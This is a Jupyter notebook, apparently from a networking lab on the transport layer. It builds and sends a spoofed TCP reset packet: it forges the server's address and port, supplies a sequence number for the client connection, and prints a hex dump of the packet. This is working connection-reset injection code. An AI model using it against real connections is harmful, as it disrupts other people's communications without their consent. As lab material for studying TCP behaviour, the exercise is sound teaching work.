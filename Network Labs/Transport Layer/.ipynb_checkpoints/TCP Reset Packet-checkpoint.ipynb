{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "630889eb-f22c-43f9-a9ab-1b36f0083efd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "  List of available devices to send/recieve from:\n",
      "  Use the name from the 'Name' column as your dev argument to the raw_send family of functions\n",
      "  You can also find this information from 'ipconfig /all' under the Description column.\n",
      "\n",
      "Source   Index  Name                               MAC                IPv4           IPv6                              \n",
      "libpcap  1      Software Loopback Interface 1      00:00:00:00:00:00  127.0.0.1      ::1                               \n",
      "libpcap  13     WAN Miniport (IP)                                                                                      \n",
      "libpcap  14     vmxnet3 Ethernet Adapter           VMware:01:4e:df    172.16.91.10   a:c:7:9:9d3f:cebf:487e:4007       \n",
      "                                                                                     dead:beef:beef:dead:d419:bd42:16f_\n",
      "                                                                                     a:c:7:9:d400:29f8:73b1:af92       \n",
      "                                                                                     dead:beef:beef:dead:9d3f:cebf:487_\n",
      "                                                                                     a:c:7:9:d419:bd42:16fb:a917       \n",
      "                                                                                     fe80::d419:bd42:16fb:a917         \n",
      "                                                                                     9:9:9:2:9d3f:cebf:487e:4007       \n",
      "                                                                                     a:c:7:9:51b9:fad2:d962:9e91       \n",
      "                                                                                     9:9:9:2:d419:bd42:16fb:a917       \n",
      "libpcap  19     WAN Miniport (Network Monitor)                                                                         \n",
      "libpcap  20     VirtualBox Host-Only Ethernet Ad_  0a:00:27:00:00:14  192.168.56.1   fe80::702a:1772:334b:a8f8         \n",
      "libpcap  21     VMware Virtual Ethernet Adapter _  VMware:c0:00:01    192.168.152.1  fe80::7daa:ca7d:27d4:a6ed         \n",
      "libpcap  22     VMware Virtual Ethernet Adapter _  VMware:c0:00:08    192.168.15.1   fe80::6d06:da9f:ce5c:b8c2         \n",
      "libpcap  24     WAN Miniport (IPv6)                                                                                    \n"
     ]
    }
   ],
   "source": [
    "import functions as f\n",
    "import cno_net_helper as cno;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "552a1962-ef7f-434e-b4c1-fe7d8115ee47",
   "metadata": {},
   "outputs": [],
   "source": [
    "server_ip = f.addr_to_bytes(\"172.16.91.10\",10,\".\")\n",
    "server_mac = f.addr_to_bytes(\"00:50:56:01:4e:df\")\n",
    "client_ip = f.addr_to_bytes(\"172.16.91.190\",10,\".\")\n",
    "client_mac = f.addr_to_bytes(\"00:0c:29:29:3b:99\")\n",
    "server_port = f.port_to_bytes(8888)\n",
    "client_port = f.port_to_bytes(49691) # Update"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "17a54b62-326d-4bb5-809e-44bb384bc8f7",
   "metadata": {},
   "outputs": [],
   "source": [
    "eth_header = f.EthernetHeader(client_mac, server_mac, b\"\\x08\\x00\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "af6ec67f-5ea7-47a4-b0ba-bdbef699160e",
   "metadata": {},
   "outputs": [],
   "source": [
    "ip4_header = f.IPHeader(protocol = b\"\\x06\", src_address = server_ip, dst_address = client_ip)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "de0b73df-d2f2-4065-a734-2afecd7989c1",
   "metadata": {},
   "outputs": [],
   "source": [
    "ack = f.num_to_32bit(0)\n",
    "seq = f.num_to_32bit(3316035953) # Update"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "1defda8e-48d0-48db-abb1-618a0c79979b",
   "metadata": {},
   "outputs": [],
   "source": [
    "tcp_header = f.TCPHeader(src_port=server_port, dst_port=client_port, seq_num = seq, ack_num = ack, window=f.port_to_bytes(8212))\n",
    "tcp_header.toggle_flag([\"RST\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "93466236-ba0a-4a38-9f2c-d6784b233a0d",
   "metadata": {},
   "outputs": [],
   "source": [
    "ip4_header.update_length(tcp_header.get_header())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "62c2f4e0-480b-4e00-8c06-8fa8774c0d61",
   "metadata": {},
   "outputs": [],
   "source": [
    "packet = eth_header.get_header() + ip4_header.get_header() + tcp_header.get_header()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "f7be7d1e-2b63-4240-aa5b-bb66083be92c",
   "metadata": {},
   "outputs": [],
   "source": [
    "cno.rawsend_cksum_ipv4(packet, dev = f.dev )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "f3e86e2f-2a0e-401f-8cc0-2ef3cc7bd047",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'00 0c 29 29 3b 99 00 50 56 01 4e df 08 00 45 00 00 28 00 00 00 00 0f 06 00 00 ac 10 5b 0a ac 10 5b be 22 b8 c2 1b c5 a6 b1 71 00 00 00 00 50 04 20 14 00 00 00 00'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "f.packet_dump(packet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a0330c3-e35a-4002-a99b-ced79f171535",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
